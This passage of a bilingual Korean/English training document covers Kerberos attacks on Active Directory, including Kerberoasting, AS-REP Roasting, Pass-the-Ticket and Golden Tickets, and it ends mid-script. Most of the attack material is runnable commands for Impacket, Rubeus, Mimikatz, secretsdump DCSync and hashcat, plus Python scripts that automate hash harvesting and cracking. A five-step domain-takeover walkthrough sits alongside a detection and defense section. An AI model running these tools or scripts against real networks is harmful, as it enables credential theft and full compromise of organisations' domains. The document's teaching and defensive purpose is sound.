  # AS-REP Roasting + 자동 크래킹
  %(prog)s asrep 10.10.10.100 corp.local -U userlist.txt \\
      -w /usr/share/wordlists/rockyou.txt --workers 20
        """
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    asrep_p = sub.add_parser("asrep", help="AS-REP Roasting")
    asrep_p.add_argument("dc", help="도메인 컨트롤러 IP")
    asrep_p.add_argument("domain", help="도메인 (예: corp.local)")
    asrep_p.add_argument("-U", "--userlist", type=Path, required=True,
                         help="사용자명 목록 파일 (한 줄에 하나)")
    asrep_p.add_argument("-w", "--wordlist", type=Path,
                         help="크래킹용 단어 목록")
    asrep_p.add_argument("--workers", type=int, default=10,
                         help="동시 요청 수 (기본값: 10)")

    args = parser.parse_args()

    match args.cmd:
        case "asrep":
            usernames = args.userlist.read_text().splitlines()
            usernames = [u.strip() for u in usernames if u.strip()]
            print(f"[*] AS-REP Roasting 시작: {len(usernames)}개 계정 대상")
            targets = batch_asrep_roast(args.dc, args.domain, usernames, args.workers)
            print(f"[+] 해시 획득: {len(targets)}개")

            if args.wordlist and targets:
                print(f"\n[*] 크래킹 시작 (단어 목록: {args.wordlist})")
                cracked = crack_kerberos_hashes(targets, args.wordlist)
                print(f"\n[결과] 크래킹 성공: {cracked}/{len(targets)}")


if __name__ == "__main__":
    main()
```

---

## 7. 실전 시나리오: AD 완전 장악 5단계

실제 침투 테스터와 APT 그룹이 사용하는 일반적인 AD 장악 경로다.

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1단계: 초기 침입 — 도메인 일반 사용자 계정 획득
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

방법:
  - 피싱 이메일 → 자격증명 수집 (Credential Harvesting)
  - 공개된 서비스 취약점 (VPN, OWA, Citrix) → 셸 획득
  - 직원 PC 멀웨어 감염 (Emotet, Qakbot 등)

결과: 저권한 도메인 계정 하나
  예: CORP\jsmith (일반 사원 계정)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2단계: 내부 정찰 — AD 구조 파악
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

도구: BloodHound, PowerView, ADRecon

BloodHound로 공격 경로 시각화:
  bloodhound-python -u jsmith -p Password -d corp.local \
    -dc dc01.corp.local --dns-tcp -c All
  
  BloodHound GUI에서:
  - "Shortest Path to Domain Admin" 쿼리 실행
  - Kerberoastable 계정 확인
  - AS-REP Roastable 계정 확인
  - 관리자 권한 체인 확인

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3단계: 권한 상승 — 서비스 계정 크래킹 또는 취약점 악용
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

경로 A — Kerberoasting:
  SPN이 등록된 서비스 계정 발견 → 티켓 요청 → 크래킹
  → IT-SVC-BACKUP 계정의 패스워드 "Summer2023!" 획득
  → 이 계정이 서버 관리 그룹 멤버

경로 B — AS-REP Roasting:
  DONT_REQ_PREAUTH 계정 발견 → 해시 수집 → 크래킹
  → 인턴 계정 "TempUser01" 패스워드 크래킹
  → 이 계정이 특정 서버에 로컬 관리자 권한

경로 C — 취약점 악용:
  PrintNightmare, ZeroLogon, noPac 등 로컬/도메인 취약점

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4단계: 횡적 이동 — DC에 접근
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

획득한 서비스 계정 또는 로컬 관리자 권한으로:
  - Pass-the-Hash로 다른 서버로 이동
  - 서버 메모리(LSASS)에서 추가 자격증명 덤프
  - 더 높은 권한 계정 발견

최종 목표: DC에 로컬 관리자 또는 DA(Domain Admin) 계정으로 접근

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
5단계: 도메인 장악 — krbtgt 해시 획득 → Golden Ticket
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DC 접근 후:
  # DCSync — DC를 사칭해 모든 계정 해시 덤프
  python3 secretsdump.py domain.local/admin:Password@DC_IP
  
  # 중요 계정 해시:
  # krbtgt:::: → Golden Ticket 생성
  # Administrator:::: → 직접 인증
  # 모든 사용자 해시 → 오프라인 크래킹

Golden Ticket 생성 후:
  → 도메인 내 모든 서비스 접근 가능
  → krbtgt 2회 리셋 전까지 영구 백도어
  → 다른 도메인(Trust)으로 확산 가능

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
결과: 전체 기업 장악
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 8. 탐지 및 방어

| 공격 | 탐지 방법 | 방어 |
|------|-----------|------|
| Kerberoasting | Event 4769: RC4 암호화 TGS-REQ 급증, 단일 소스 | 서비스 계정 강력 패스워드 (25자+) / gMSA 사용 / AES 전용 설정 |
| AS-REP Roasting | Event 4768: RC4 암호화 AS-REQ (사전 인증 없음) | 모든 계정 사전 인증 활성화 / DONT_REQ_PREAUTH 제거 |
| Pass-the-Ticket | 비정상 티켓 출처 IP / 계정과 무관한 서비스 접근 | Kerberos Armoring (FAST) / Protected Users 그룹 |
| Golden Ticket | krbtgt 해시 탈취 (DCSync) 탐지 / 비정상 TGT 수명 | krbtgt 정기 패스워드 리셋 (2회) / Privileged Access Workstation |
| Silver Ticket | 서비스 로그 없는 서비스 접근 이벤트 | 서비스 계정 패스워드 강화 / 정기 로테이션 |
| Overpass-the-Hash | NTLM → Kerberos 변환 탐지 / Event 4648 | Credential Guard 활성화 / NTLM 제한 |

**gMSA (Group Managed Service Accounts) 설정 — Kerberoasting 완전 방어:**
```powershell
# gMSA 생성 — 240자 패스워드 자동 생성, 자동 로테이션
New-ADServiceAccount -Name "sql-svc" -DNSHostName "sql.corp.local" \
  -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers_Group"

# gMSA를 서비스 계정으로 설정
Install-ADServiceAccount -Identity "sql-svc"
# 이후 hashcat으로 240자 패스워드 크래킹은 사실상 불가능
```

---

<!-- detect-validate-54 -->
## 공격 탐지와 방어 검증

AD 공격은 *어떻게 도메인을 장악하는가*를 다루지만, 방어자 관점에서는 **그 기법이 Windows 보안 이벤트에 남는가**와 **통제가 실제로 막는가**를 검증해야 한다. 공격자도 이 관점으로 어떤 통제가 실효적인지 가늠할 수 있다.

### 공격 → 완화 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 완화 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| Kerberoasting | - | AES 강제, 강한 SPN 계정 PW, gMSA | EID 4769 RC4(0x17) 티켓 요청 급증 |
| AS-REP Roasting | - | 프리인증 강제(`DONT_REQ_PREAUTH` 제거) | EID 4768 프리인증 미요구 계정 |
| Golden/Silver Ticket | - | krbtgt 2회 리셋, 모니터링 | EID 4769 비정상 티켓, 미존재 계정 TGT |

### 방어 검증 (직접 확인)

```powershell
# 1) RC4 티켓 요청(Kerberoasting 신호)이 로깅되는지 — 4769 + 암호화 0x17
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} -MaxEvents 50 |
  Where-Object { $_.Message -match '0x17' }
# 2) 프리인증 미요구 계정(AS-REP 대상) 존재 확인
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth
# 비어야 정상; 있으면 AS-REP Roasting 노출 → 해당 계정 프리인증 강제
```

> 검증은 반드시 **소유한 시스템·통제된 환경**에서만 수행한다. 완화를 "설정했다"와 "런타임에 실제 막힌다"는 다르다 — PoC 를 재현해 완화가 차단하는지 확인해야 신뢰할 수 있다([[68_Purple_Team]]).

---


<a name="english"></a>

# Kerberos Attacks — Kerberoasting, AS-REP Roasting, and Ticket Attacks

## Learning Objectives

After completing this document, you will be able to:

- Explain what Active Directory is and why it is the cornerstone of enterprise security
- Describe the complete Kerberos authentication flow to a beginner using the amusement park analogy
- Distinguish between Kerberoasting and AS-REP Roasting, including each attack's prerequisites
- Explain the difference between Golden Tickets and Silver Tickets, and when each is used
- Write and analyze Python scripts automating Kerberos attacks
- Apply detection methods and defense strategies for each Kerberos attack
- Understand the 5-step practical scenario for complete AD compromise

---

## Active Directory Fundamentals — "The Company Employee Directory + Access Control System"

### What is Active Directory?

Active Directory (AD) is **Microsoft's centralized identity and access management system**. The simplest way to think of it: "the company's employee directory combined with its physical access control system."

**Real-world analogy:**
- To enter a corporate headquarters, you need an employee badge
- The HR department issues and manages those badges
- Certain floors or server rooms require additional permissions
- HR keeps records of who is allowed into which room

In Active Directory terms:
- **Employee directory** = AD's database of user accounts, computers, and groups
- **Badge-issuing machine** = KDC (Key Distribution Center)
- **Access control gates** = Individual services (file server, email server, etc.)
- **Security office** = Domain Controller (DC)

### Key Concepts

**Domain:** The basic administrative unit in AD. Has a DNS name like `corp.example.com`. Users, computers, and policies within a domain share one administrative boundary.

**Domain Controller (DC):** The server hosting the AD database (NTDS.DIT). Compromising a DC means controlling every account and resource in the domain. **DC compromise = total enterprise compromise.**

**Forest:** The top-level container grouping multiple domains. Different companies or divisions can be connected through Trust relationships.

**Trust:** A relationship allowing two domains to recognize each other's accounts. Compromising one domain and leveraging its Trust relationships enables lateral movement into connected domains.

**NTDS.DIT:** The core AD database file. Contains all user accounts, encrypted password hashes, and group memberships. Obtaining this file enables offline cracking of every account's password hash in the domain.

### Why AD is the Core Security Target

```
Approximately 90% of enterprises worldwide use Windows + Active Directory.
→ Most enterprise breaches involve AD attacks.
→ Compromising AD gives access to all Windows machines, file servers,
  email servers, and databases.
→ Ransomware actors compromise AD then deploy ransomware simultaneously
  to every machine in the domain.

Typical APT attack chain:
  1. Initial access (phishing, vulnerability exploitation)
  2. Lateral movement (pivot between systems)
  3. AD DC compromise (obtain Domain Admin privileges)
  4. Data exfiltration / ransomware deployment
```

---

## Kerberos Fundamentals — For Complete Beginners

### Kerberos is an Amusement Park Ticketing System

The easiest way to understand Kerberos is to think of it as an **amusement park ticketing system**.

```
Real amusement park:                    Kerberos:
═══════════════════════════════════════════════════════════════════
Ticket booth (ID verification)     →   KDC's AS (Authentication Service)
Day pass issuance                  →   TGT (Ticket Granting Ticket) issuance
Pass management window             →   KDC's TGS (Ticket Granting Service)
Specific ride ticket               →   Service Ticket
Ride boarding gate                 →   Individual service (file server, email, etc.)

Flow:
1. Show ID at ticket booth → receive day pass  (login → TGT)
2. Want to ride the roller coaster → show day pass at management window
3. Window issues "roller coaster boarding pass"  (TGS issues service ticket)
4. Present boarding pass at ride gate → ride!  (service access)

Key insight:
- No need to show ID at every ride (SSO, Single Sign-On)
- Stealing the day pass (TGT) = can ride any attraction (Golden Ticket)
- Stealing a specific boarding pass = can ride only that attraction (Silver Ticket)
```

### Complete Kerberos Authentication Flow

```
Client          KDC (AS)                KDC (TGS)              Service
    │                │                       │                     │
    │  [1] AS-REQ    │                       │                     │
    │ ─────────────> │                       │                     │
    │  Pre-auth:     │                       │                     │
    │  username +    │                       │                     │
    │  timestamp     │                       │                     │
    │  encrypted     │                       │                     │
    │  with password │                       │                     │
    │                │                       │                     │
    │  [2] AS-REP    │                       │                     │
    │ <───────────── │                       │                     │
    │  TGT issued:   │                       │                     │
    │  encrypted     │                       │                     │
    │  with krbtgt   │                       │                     │
    │  hash          │                       │                     │
    │                │                       │                     │
    │  [3] TGS-REQ   │                       │                     │
    │ ────────────────────────────────────>  │                     │
    │  "Give me a    │                       │                     │
    │  ticket for    │                       │                     │
    │  MSSQLSvc/db"  │                       │                     │
    │  (TGT attached)│                       │                     │
    │                │                       │                     │
    │  [4] TGS-REP   │                       │                     │
    │ <──────────────────────────────────── │                     │
    │  Service ticket│                       │                     │
    │  encrypted     │                       │                     │
    │  with service  │                       │                     │
    │  account hash  │                       │                     │
    │                │                       │                     │
    │  [5] AP-REQ    │                       │                     │
    │ ───────────────────────────────────────────────────────>    │
    │  Present       │                       │                     │
    │  service ticket│                       │                     │
    │                │                       │                     │
    │  [6] AP-REP    │                       │                     │
    │ <───────────────────────────────────────────────────────    │
    │  Access granted│                       │                     │
```

**Explanation of each step:**

- **[1] AS-REQ:** The client sends its username plus a timestamp encrypted with its password (pre-authentication). If the KDC can decrypt it, the client has proven knowledge of the password.

- **[2] AS-REP:** The KDC issues a TGT encrypted with the **krbtgt account's password hash**. The client cannot read the TGT's contents. This is the "day pass."

- **[3] TGS-REQ:** When the client needs to access a specific service, it presents the TGT to the TGS and requests a service ticket.

- **[4] TGS-REP:** The TGS issues a service ticket encrypted with the **service account's password hash**. This is the core of Kerberoasting — this encrypted ticket can be cracked offline.

- **[5] AP-REQ:** The client presents the service ticket to the service.

- **[6] AP-REP:** The service validates the ticket and grants access.

### What is Pre-Authentication?

Pre-authentication means **encrypting a timestamp with the user's password and sending it in the AS-REQ**.

**Why it exists:**
Without pre-authentication, anyone can send an AS-REQ for any account and receive an AS-REP (TGT). Since the AS-REP is encrypted with that account's password, it can be cracked offline. This is exactly the **AS-REP Roasting** attack.

```
With pre-authentication (normal):
  Client: timestamp + encrypted with password → sent to KDC
  KDC: successful decryption = password confirmed → issue TGT
  → Cannot receive TGT without knowing the password

Without pre-authentication (DONT_REQ_PREAUTH set):
  Client: just sends the username
  KDC: issues TGT encrypted with password (no verification!)
  → Attacker only needs the username to receive AS-REP for offline cracking
```

**Why does this setting exist?** Some legacy applications do not support Kerberos pre-authentication. This option exists for compatibility purposes, but it is a serious security vulnerability.

### What is an SPN (Service Principal Name)?

An SPN is a **unique identifier for a service**. To request a Kerberos ticket for a specific service, you must know its SPN.

```
SPN format: ServiceType/hostname:port@domain
Examples:
  MSSQLSvc/dbserver.corp.local:1433    → SQL Server
  HTTP/webserver.corp.local            → Web service
  HOST/fileserver.corp.local           → File server

Why SPNs matter for Kerberoasting:
  1. Any domain user can request a service ticket for any registered SPN
  2. That ticket is encrypted with the service account's password hash
  3. → Anyone with a domain account can obtain service account tickets for cracking
```

### RC4 vs AES — Why Encryption Type Matters for Attacks

```
RC4-HMAC (legacy):
  - Original Kerberos encryption algorithm
  - Quickly cracked with hashcat mode 13100
  - Still permitted in most AD environments for backward compatibility
  - Attackers specifically request RC4 tickets (faster to crack)

AES256-CTS-HMAC-SHA1 (modern):
  - Much stronger encryption
  - Significantly harder and slower to crack than RC4
  - Service accounts can be configured to reject RC4 requests

Attacker strategy:
  Request RC4 tickets during Kerberoasting
  → Same password cracks much faster than AES equivalent
  → Possible when "msDS-SupportedEncryptionTypes" allows RC4
```

---

## 1. Kerberos Authentication Flow (Diagram)

```
Client          KDC (AS)           KDC (TGS)          Service
    │                │                    │                 │
    │─── AS-REQ ────>│                    │                 │
    │  (pre-auth:    │                    │                 │
    │   timestamp    │                    │                 │
    │   encrypted    │                    │                 │
    │   with         │                    │                 │
    │   password)    │                    │                 │
    │<── AS-REP ─────│                    │                 │
    │   (TGT issued: │                    │                 │
    │    encrypted   │                    │                 │
    │    with krbtgt │                    │                 │
    │    hash)       │                    │                 │
    │                │                    │                 │
    │──────── TGS-REQ (with TGT) ────────>│                 │
    │         "Request service ticket     │                 │
    │          for SPN=MSSQLSvc/db:1433"  │                 │
    │<──────── TGS-REP (service ticket) ──│                 │
    │          (encrypted with service    │                 │
    │           account password hash)    │                 │
    │                                     │                 │
    │──────────── AP-REQ (service ticket) ────────────────>│
    │<──────────── AP-REP (auth success) ─────────────────│
```

---

## 2. Kerberoasting — "Offline Cracking of Service Account Tickets"

### Why Kerberoasting Works

**By design:** The Kerberos specification allows **any authenticated domain user to request service tickets for any SPN**. This is not a bug — it is an intentional feature.

```
Legitimate purpose:
  Employee A wants to access the SQL server → needs a SQL service ticket
  → Request from TGS with domain account → receive SQL service ticket

Attacker's exploitation:
  Attacker obtains any low-privilege domain account
  → Requests service tickets for all SPNs
  → Each ticket is encrypted with the service account's password hash
  → Save to file, crack offline
  → Recover service account password → privilege escalation
```

**Why weak passwords are catastrophic:**
```
Service ticket encryption:
  Service account password → NTLM hash → used as RC4 key
  TGS encrypts session key with this RC4 key

Cracking process:
  hashcat converts each word in the wordlist to an NTLM hash
  Attempts to decrypt using that hash as the RC4 key
  Successful decryption → password found

Why service accounts are especially vulnerable:
  "Password123" cracks in seconds
  Most service accounts don't have humans logging in daily
  → Password policies are often set to "never expire" with weaker requirements
```

### 2.1 Kerberoasting Commands

```bash
# Impacket GetUserSPNs — enumerate SPNs and request tickets
python3 GetUserSPNs.py -dc-ip 10.10.10.100 domain.local/user:Password \
  -request -outputfile kerberoast.hashes
# -request: also request tickets (without it, only lists SPNs)
# -outputfile: saves hashes in hashcat format

# SPN enumeration only (no ticket request)
python3 GetUserSPNs.py -dc-ip 10.10.10.100 domain.local/user:Password
# Output: service account names, SPNs, last logon, password expiry, etc.

# Rubeus (on a Windows domain-joined machine)
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
# /nowrap: output hashes on a single line for easy file saving

# Rubeus — force RC4 request (easier to crack)
.\Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec /nowrap
# /rc4opsec: requests RC4-encrypted tickets (faster to crack)

# PowerView (PowerShell — on domain)
Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash |
  Out-File -FilePath kerberoast.hashes

# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23 / RC4)
hashcat -a 0 -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule
# -a 0: dictionary attack
# -m 13100: Kerberoasting hash mode
# --rules-file: mutation rules (Password → P@ssw0rd, etc.)
```

### 2.2 Kerberoasting Automation CLI

```python
#!/usr/bin/env python3
"""Kerberoasting automation using Impacket.

Usage:
  python3 kerberoast_auto.py 10.10.10.100 corp.local -u user -p Password
  python3 kerberoast_auto.py 10.10.10.100 corp.local -u user -p Password --crack
"""

import argparse
import subprocess
from pathlib import Path


def run_kerberoast(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    output_file: Path,
) -> list[str]:
    """Run GetUserSPNs and extract hashes.
    
    Impacket's GetUserSPNs:
    1. Uses LDAP to enumerate accounts with registered SPNs.
    2. Requests TGS-REP (service ticket) for each account.
    3. Outputs hashes in hashcat-compatible format.
    """
    cmd = [
        "python3", "-m", "impacket.examples.GetUserSPNs",
        f"{domain}/{username}:{password}",
        "-dc-ip", dc_ip,
        "-request",
        "-outputfile", str(output_file),
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    print(result.stdout)
    if result.returncode != 0:
        print(f"Error: {result.stderr}")
        return []

    hashes = []
    if output_file.exists():
        hashes = output_file.read_text().strip().splitlines()
        print(f"\n[+] Obtained {len(hashes)} hash(es)")

    return hashes


def crack_hashes(
    hash_file: Path,
    wordlist: Path,
    rules_file: Path | None = None,
    hash_mode: int = 13100,
) -> list[str]:
    """Crack Kerberos hashes with hashcat.
    
    Mode 13100: Kerberos 5 TGS-REP etype 23 (RC4, Kerberoasting)
    Mode 19600: Kerberos 5 TGS-REP etype 17 (AES128)
    Mode 19700: Kerberos 5 TGS-REP etype 18 (AES256)
    """
    cmd = [
        "hashcat", "-a", "0", "-m", str(hash_mode),
        str(hash_file), str(wordlist),
        "--potfile-path", "/tmp/kerberoast.pot",
        "--quiet",
    ]
    if rules_file:
        cmd.extend(["--rules-file", str(rules_file)])

    subprocess.run(cmd, timeout=3600)

    pot_file = Path("/tmp/kerberoast.pot")
    cracked = []
    if pot_file.exists():
        for line in pot_file.read_text().splitlines():
            if ":" in line:
                cracked.append(line.split(":")[-1])

    return cracked


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kerberoasting automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 10.10.10.100 corp.local -u user -p Password
  %(prog)s 10.10.10.100 corp.local -u user -p Password --crack -w rockyou.txt
        """
    )
    parser.add_argument("dc", help="Domain Controller IP")
    parser.add_argument("domain", help="Domain (e.g., corp.local)")
    parser.add_argument("-u", "--user", required=True, help="Domain username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-o", "--output", type=Path,
                        default=Path("/tmp/kerberoast.hashes"),
                        help="Hash output file path")
    parser.add_argument("-w", "--wordlist", type=Path,
                        default=Path("/usr/share/wordlists/rockyou.txt"),
                        help="Wordlist for cracking")
    parser.add_argument("--crack", action="store_true",
                        help="Automatically run cracking after hash extraction")
    args = parser.parse_args()

    hashes = run_kerberoast(args.dc, args.domain, args.user, args.password, args.output)

    if args.crack and hashes:
        print("\n[*] Starting hash cracking...")
        cracked = crack_hashes(args.output, args.wordlist)
        print(f"[+] Cracked: {len(cracked)}")
        for pw in cracked:
            print(f"  Password: {pw}")


if __name__ == "__main__":
    main()
```

---

## 3. AS-REP Roasting — "Attacking Without Domain Credentials"

### How AS-REP Roasting Differs from Kerberoasting

```
Kerberoasting:
  Prerequisite: Requires a valid domain account (any account)
  Principle:    Crack service ticket (TGS-REP) encrypted with service account password
  Target:       Accounts with registered SPNs (service accounts)
  hashcat mode: 13100

AS-REP Roasting:
  Prerequisite: Only needs a list of usernames — NO domain credentials!
  Principle:    Crack AS-REP (TGT) partially encrypted with user's password
  Target:       Accounts with DONT_REQ_PREAUTH flag set
  hashcat mode: 18200

Why AS-REP Roasting is powerful:
  → Can attack from outside the network without any domain account
  → Start with a public username list (e.g., harvested from LinkedIn)
  → On first match, immediately crack offline
```

### Username Enumeration with Kerbrute

```bash
# Kerbrute enumerates valid usernames without a domain account
# Distinguishes "account exists" from "account doesn't exist" by error type:
# - Account exists: KDC returns PREAUTH_REQUIRED error
# - Account doesn't exist: KDC returns PRINCIPAL_UNKNOWN error

./kerbrute userenum --dc 10.10.10.100 -d corp.local usernames.txt

# Username list sources:
# - Infer email format from public info (firstname.lastname@company.com)
# - Scrape employee names from LinkedIn
# - Public GitHub commit email addresses
# - OWA (Outlook Web Access) email enumeration
```

### 3.1 AS-REP Roasting Commands

```bash
# Impacket GetNPUsers — works WITHOUT a domain account
python3 GetNPUsers.py domain.local/ -dc-ip 10.10.10.100 \
  -usersfile users.txt -format hashcat -outputfile asrep.hashes
# users.txt: list of usernames to try (one per line)
# -format hashcat: output in hashcat-compatible format
# No domain credentials needed — username list is sufficient

# With a domain account — automatically enumerate vulnerable accounts
python3 GetNPUsers.py domain.local/user:Password -dc-ip 10.10.10.100 \
  -request -format hashcat -outputfile asrep.hashes
# Uses LDAP to automatically find DONT_REQ_PREAUTH accounts

# Crack with hashcat (mode 18200 = Kerberos 5 AS-REP etype 23)
hashcat -a 0 -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule

# Rubeus (Windows environment)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /nowrap
```

---

## 4. Pass-the-Ticket (PtT)

Kerberos tickets extracted from memory or forged can authenticate as the ticket's owner without knowing the password.

```bash
# Dump Kerberos tickets from memory using Mimikatz
mimikatz # sekurlsa::tickets /export
# Saves tickets as .kirbi files (including any cached TGTs)

# Rubeus — dump and export tickets
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe dump /service:krbtgt /nowrap

# Linux: use .ccache file with KRB5CCNAME environment variable
export KRB5CCNAME=/tmp/admin.ccache
python3 psexec.py -k -no-pass domain.local/admin@dc.domain.local
# -k: use Kerberos authentication
# -no-pass: use ticket file instead of password

# Impacket ticket format conversion
python3 ticketConverter.py admin.kirbi admin.ccache
# Convert Windows format (.kirbi) ↔ Linux format (.ccache)
```

---

## 5. Golden Ticket vs Silver Ticket — Comparison

### The Core Difference

```
Golden Ticket:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Requires:    krbtgt account NTLM hash
Ticket type: TGT (Ticket Granting Ticket — the "day pass")
Scope:       Any service in the domain, any user
             (including users that don't exist!)
Lifetime:    Can be set up to 10 years (normal is 10 hours)
Strength:    Remains valid until krbtgt password is reset twice
Weakness:    Requires krbtgt hash (needs DCSync or direct DC access)
Analogy:     "Forge a lifetime all-rides pass for the amusement park"

Silver Ticket:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Requires:    Specific service account NTLM hash (NOT krbtgt)
Ticket type: Service ticket (specific service only)
Scope:       That one service only
Lifetime:    Customizable
Strength:    Does not communicate with KDC → harder to detect
             Service account hashes are easier to obtain than krbtgt
Weakness:    Access limited to the targeted service only
Analogy:     "Forge a ticket for just one specific ride"
```

### Why Two krbtgt Password Resets are Required

```
How the krbtgt account works:
  - The krbtgt account signs all TGTs in the domain
  - After 1 password reset:
    Both the current (Active) and previous (Previous) keys coexist
    Existing Golden Tickets remain valid (KDC accepts tickets signed by Previous key)
  - After 2 password resets:
    The Previous key is replaced with the new key
    Existing Golden Tickets are completely invalidated

Recommended procedure:
  1. First krbtgt password reset
  2. Wait at least 10 hours (to let legitimate TGTs expire naturally)
  3. Second krbtgt password reset
  4. Existing Golden Tickets are now fully invalidated
  
  Warning: Resetting without prior notice forces all domain users to
  re-authenticate. Schedule during a maintenance window.
```

### 5.1 Golden Ticket Attack

```bash
# Step 1: Extract krbtgt hash via DCSync
# DCSync impersonates a DC and requests AD replication → dumps password hashes
python3 secretsdump.py -just-dc domain.local/admin:Password@DC_IP

# Step 2: Get domain SID
python3 getPac.py -targetUser administrator -domain domain.local \
  -dc-ip 10.10.10.100 domain.local/user:Password

# Step 3: Create and inject Golden Ticket using Mimikatz
mimikatz # kerberos::golden /user:administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX /krbtgt:NTLMHASH /id:500 /ptt
# /user: the user to impersonate (can be non-existent)
# /sid:  domain SID
# /krbtgt: krbtgt NTLM hash
# /id:   user RID (500 = Administrator)
# /ptt:  Pass-the-Ticket (inject into current session immediately)

# Impacket ticketer (Linux)
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX \
  -domain domain.local administrator

export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

---

## 6. Kerberos Attack Automation Script

```python
#!/usr/bin/env python3
"""Kerberos attack chain automation — AS-REP Roasting + cracking + reporting.

Usage:
  # AS-REP Roasting (no domain credentials needed)
  python3 kerberos_attack.py asrep 10.10.10.100 corp.local -U userlist.txt

  # AS-REP Roasting with automatic cracking
  python3 kerberos_attack.py asrep 10.10.10.100 corp.local \\
      -U userlist.txt -w /usr/share/wordlists/rockyou.txt --workers 20
"""

import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path


@dataclass
class KerberosTarget:
    username: str                        # Target username
    hash_: str                           # Obtained Kerberos hash
    cracked_password: str | None = None  # Cracked password (if successful)


def asrep_roast_user(dc_ip: str, domain: str, username: str) -> str | None:
    """Attempt AS-REP Roasting for a single user.
    
    Sends an AS-REQ without pre-authentication for accounts with
    DONT_REQ_PREAUTH set. If the KDC responds with an AS-REP, extract the
    crackable hash from the response.
    """
    cmd = [
        "python3", "-m", "impacket.examples.GetNPUsers",
        f"{domain}/{username}",
        "-dc-ip", dc_ip,
        "-no-pass",        # No password needed — works without domain credentials
        "-format", "hashcat",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    # "$krb5asrep$" in output means we got a crackable hash
    if "$krb5asrep$" in result.stdout:
        lines = [line for line in result.stdout.splitlines() if "$krb5asrep$" in line]
        return lines[0] if lines else None
    return None


def batch_asrep_roast(
    dc_ip: str,
    domain: str,
    usernames: list[str],
    max_workers: int = 10,
) -> list[KerberosTarget]:
    """Run AS-REP Roasting against multiple users in parallel.
    
    Uses ThreadPoolExecutor to send simultaneous requests.
    Note: too many concurrent requests may trigger IDS/IPS alerts.
    """
    targets: list[KerberosTarget] = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(asrep_roast_user, dc_ip, domain, u): u
            for u in usernames
        }
        for future in as_completed(futures):
            username = futures[future]
            hash_ = future.result()
            if hash_:
                print(f"[+] AS-REP hash obtained: {username}")
                targets.append(KerberosTarget(username=username, hash_=hash_))

    return targets


def crack_kerberos_hashes(
    targets: list[KerberosTarget],
    wordlist: Path,
    hash_mode: int = 18200,  # 18200=AS-REP, 13100=TGS
) -> int:
    """Crack Kerberos hashes with hashcat and map results back to usernames.
    
    Hash modes:
      18200: AS-REP Roasting (krb5asrep)
      13100: Kerberoasting (krb5tgs) RC4
      19600: Kerberoasting AES128
      19700: Kerberoasting AES256
    """
    if not targets:
        return 0

    hash_file = Path("/tmp/kerberos_hashes.txt")
    hash_file.write_text("\n".join(t.hash_ for t in targets))

    pot_file = Path("/tmp/kerberos.pot")
    pot_file.unlink(missing_ok=True)

    cmd = [
        "hashcat", "-a", "0", "-m", str(hash_mode),
        str(hash_file), str(wordlist),
        "--potfile-path", str(pot_file),
        "--quiet",
    ]
    subprocess.run(cmd, timeout=3600)

    # Map cracked passwords back to individual users
    cracked_count = 0
    if pot_file.exists():
        pot_data = dict(
            line.rsplit(":", 1) for line in pot_file.read_text().splitlines() if ":" in line
        )
        for target in targets:
            hash_prefix = target.hash_.split("$")[-1][:20]
            for hash_key, password in pot_data.items():
